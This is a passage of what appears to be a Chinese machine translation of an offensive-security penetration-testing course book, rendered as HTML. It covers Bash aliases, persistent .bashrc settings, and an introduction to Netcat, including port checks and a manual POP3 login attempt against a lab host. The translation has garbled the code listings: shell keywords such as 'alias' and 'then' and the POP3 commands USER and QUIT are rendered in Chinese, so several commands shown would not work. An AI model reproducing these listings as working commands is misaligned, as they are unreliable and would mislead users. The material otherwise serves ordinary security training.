<div style="position:absolute;top:85353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">alias mkdir='ping -c 1 localhost'</font></font></font></b></nobr></div>
<div style="position:absolute;top:85387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir</font></font></font></b></nobr></div>
<div style="position:absolute;top:85404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PING localhost(localhost (::1)) 56 个数据字节</font></font></nobr></div>
<div style="position:absolute;top:85420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自本地主机 (::1) 的 64 字节：icmp_seq=1 ttl=64 时间=0.121 毫秒</font></font></nobr></div>
<div style="position:absolute;top:85455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- 本地主机 ping 统计 ---</font></font></nobr></div>
<div style="position:absolute;top:85472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送 1 个数据包，接收 1 个数据包，0% 数据包丢失，时间 0ms</font></font></nobr></div>
<div style="position:absolute;top:85489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rtt min/avg/max/mdev = 0.121/0.121/0.121/0.000 毫秒</font></font></nobr></div>
<div style="position:absolute;top:85508;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 74 - 创建一个覆盖 mkdir 命令的别名</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:85583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Man7.org, 2019), http://man7.org/linux/man-pages/man3/strftime.3.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:85711;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="73"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 73 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85744;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:86821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:86821;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:86821;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果发生这种情况，解决方法很简单。</font><font style="vertical-align: inherit;">我们可以退出当前的 shell 会话</font></font></nobr></div>
<div style="position:absolute;top:85859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unalias</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令取消设置有问题的别名。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unalias mkdir</font></font></font></b></nobr></div>
<div style="position:absolute;top:85928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir</font></font></font></b></nobr></div>
<div style="position:absolute;top:85945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir：缺少操作数</font></font></nobr></div>
<div style="position:absolute;top:85962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试“mkdir --help”以获取更多信息。</font></font></nobr></div>
<div style="position:absolute;top:85981;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 75 - 取消设置别名</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:86012;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.3 持久化 Bash 定制</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 中交互式 shell 的行为由位于以下位置的系统范围的 bashrc 文件决定</font></font></nobr></div>
<div style="position:absolute;top:86070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/bash.bashrc。</font><font style="vertical-align: inherit;">可以通过编辑 .bashrc 文件来覆盖系统范围的 Bash 设置</font></font></nobr></div>
<div style="position:absolute;top:86089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位于任何用户的主目录中。</font></font></nobr></div>
<div style="position:absolute;top:86122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上一节中，我们探索了 alias 命令，它为当前终端设置别名</font></font></nobr></div>
<div style="position:absolute;top:86141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议。</font><font style="vertical-align: inherit;">我们也可以将此命令插入到用户主目录中的 .bashrc 文件中以设置一个</font></font></nobr></div>
<div style="position:absolute;top:86161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久化别名。</font><font style="vertical-align: inherit;">.bashrc 脚本在用户登录时执行。因为这个文件是一个 shell</font></font></nobr></div>
<div style="position:absolute;top:86180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本，我们可以插入任何可以从命令提示符执行的命令。</font></font></nobr></div>
<div style="position:absolute;top:86213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们检查 Kali Linux 中默认的 /home/kali/.bashrc 文件的几行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ~/.bashrc</font></font></font></b></nobr></div>
<div style="position:absolute;top:86264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># ~/.bashrc: 由 bash(1) 为非登录 shell 执行。</font></font></nobr></div>
<div style="position:absolute;top:86282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 查看/usr/share/doc/bash/examples/startup-files（在bash-doc包中）</font></font></nobr></div>
<div style="position:absolute;top:86299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">＃ 举些例子</font></font></nobr></div>
<div style="position:absolute;top:86315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:86332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 设置历史长度见 bash(1) 中的 HISTSIZE 和 HISTFILESIZE</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86349;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTSIZE=1000</font></font></b></nobr></div>
<div style="position:absolute;top:86366;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTFILESIZE=2000</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 启用 ls 的颜色支持并添加方便的别名</font></font></nobr></div>
<div style="position:absolute;top:86417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if [ -x /usr/bin/dircolors ]; </font><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:86434;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || </font><font style="vertical-align: inherit;">eval "$(dircolors -</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:86451;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名 ls='ls --color=auto'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:86487;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 76 - 检查 .bashrc 默认文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能会认出</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTSIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HISTFILESIZE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量以及别名</font></font></nobr></div>
<div style="position:absolute;top:86536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示彩色输出的命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:86571;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个名为“..”的别名来切换到父目录并使其持久化</font></font></nobr></div>
<div style="position:absolute;top:86620;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端会话。</font></font></nobr></div>
<div style="position:absolute;top:86648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 永久配置history命令可存储10000条记录并包含完整日期</font></font></nobr></div>
<div style="position:absolute;top:86668;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在其输出中。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:86899;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="74"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 74 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:86932;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:88009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:88009;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:88009;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:87028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.10 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了一些流行的 Linux 命令行程序。</font></font></nobr></div>
<div style="position:absolute;top:87089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住参考 Kali Linux 培训站点</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以进行复习或更深入的讨论。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:87959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training/lessons/introduction/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:88087;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="75"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 75 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:88120;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:89197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:89197;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:89197;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:88210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.10.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 实用工具</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现代安全专业人员可以使用各种难以想象的高级工具</font></font></nobr></div>
<div style="position:absolute;top:88300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">短短几年前。</font><font style="vertical-align: inherit;">然而，在该领域，我们经常发现自己处于只有工具</font></font></nobr></div>
<div style="position:absolute;top:88319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的是已经安装在目标机器上的工具。</font><font style="vertical-align: inherit;">其他时候，我们可能只能</font></font></nobr></div>
<div style="position:absolute;top:88338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输小文件以扩大我们在目标网络上的立足点。</font><font style="vertical-align: inherit;">由于这些原因，至关重要的是</font></font></nobr></div>
<div style="position:absolute;top:88358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对每个渗透测试者工具包中的一些实用工具有很好的理解。</font><font style="vertical-align: inherit;">一些</font></font></nobr></div>
<div style="position:absolute;top:88377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们经常使用的工具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tcpdump</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88439;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意：视频中使用的 IP 地址与本实验指南不匹配</font></font></i></nobr></div>
<div style="position:absolute;top:88458;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的进攻性安全实验室 IP 地址。</font><font style="vertical-align: inherit;">此处使用的 IP 地址用于</font></font></i></nobr></div>
<div style="position:absolute;top:88478;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅示例，需要更改以匹配您的实验室环境。</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1 网猫</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">82</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">于 1995 年首次发布（！）*Hobbit* 是“原始”网络渗透测试之一</font></font></nobr></div>
<div style="position:absolute;top:88601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具，用途广泛，不愧为黑客的“瑞士军刀”。</font></font></nobr></div>
<div style="position:absolute;top:88620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat 最清晰的定义来自 *Hobbit* 本人：一个简单的“读写工具”</font></font></nobr></div>
<div style="position:absolute;top:88640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 TCP 或 UDP 协议跨网络连接传输数据。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">83</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88674;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.1 连接到 TCP/UDP 端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如描述所建议的，Netcat 可以在客户端或服务器模式下运行。</font><font style="vertical-align: inherit;">首先，让我们看看</font></font></nobr></div>
<div style="position:absolute;top:88731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在客户端模式。</font></font></nobr></div>
<div style="position:absolute;top:88764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用客户端模式连接到任何 TCP/UDP 端口，允许我们：</font></font></nobr></div>
<div style="position:absolute;top:88797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:88797;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查端口是打开还是关闭。</font></font></nobr></div>
<div style="position:absolute;top:88825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:88825;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从侦听端口的服务中读取横幅。</font></font></nobr></div>
<div style="position:absolute;top:88854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:88854;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动连接到网络服务。</font></font></nobr></div>
<div style="position:absolute;top:88886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们首先使用 Netcat ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 检查 TCP 端口 110（POP3 邮件服务）是否在其中之一上打开</font></font></nobr></div>
<div style="position:absolute;top:88906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室机器。</font><font style="vertical-align: inherit;">我们将提供几个参数：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项以跳过 DNS 名称解析；</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:88926;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">增加一些冗长；</font><font style="vertical-align: inherit;">目标IP地址；</font><font style="vertical-align: inherit;">和目标端口号：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 110</font></font></font></b></nobr></div>
<div style="position:absolute;top:88977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 110 (pop3) 打开</font></font></nobr></div>
<div style="position:absolute;top:88994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+OK POP3 服务器实验室准备好 &lt;00003.1277944@lab&gt;</font></font></nobr></div>
<div style="position:absolute;top:89013;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 77 - 使用 nc 连接到 TCP 端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 77 告诉我们几件事。</font><font style="vertical-align: inherit;">一、TCP连接到110端口上的10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:89062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（标准命名法中的 10.11.0.22:110）成功，因此 Netcat 报告远程端口已打开。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:89127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">82 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Netcat</font></font></font></nobr></div>
<div style="position:absolute;top:89147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">83 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Sourceforge), http://nc110.sourceforge.net</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:89275;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="76"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 76 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:89308;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:90385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:90385;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:90385;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，服务器通过“与我们对话”来响应我们的连接，打印出服务器欢迎</font></font></nobr></div>
<div style="position:absolute;top:89423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消息，并提示我们登录，这是 POP3 服务的标准行为。</font></font></nobr></div>
<div style="position:absolute;top:89456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试与服务器交互：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 110</font></font></font></b></nobr></div>
<div style="position:absolute;top:89508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 110 (pop3) 打开</font></font></nobr></div>
<div style="position:absolute;top:89525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+OK POP3 服务器实验室准备就绪 &lt;00004.1546827@lab&gt;</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89542;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户关闭</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+OK offsec 欢迎来到这里</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89576;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PASS offsec</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ERR 无法锁定邮箱</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89609;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放弃</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+OK POP3 服务器实验室签字。</font></font></nobr></div>
<div style="position:absolute;top:89644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:89663;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 78 - 使用 nc 连接到 POP3 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经成功地设法使用 Netcat 与 POP3 服务对话（即使我们的</font></font></nobr></div>
<div style="position:absolute;top:89712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录尝试失败）。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89746;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2 监听 TCP/UDP 端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Netcat 侦听 TCP/UDP 端口对于客户端应用程序的网络调试很有用，或者</font></font></nobr></div>
<div style="position:absolute;top:89803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则接收 TCP/UDP 网络连接。</font><font style="vertical-align: inherit;">让我们尝试实现一个简单的聊天服务</font></font></nobr></div>
<div style="position:absolute;top:89823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及两台机器，使用 Netcat 作为客户端和服务器。</font></font></nobr></div>
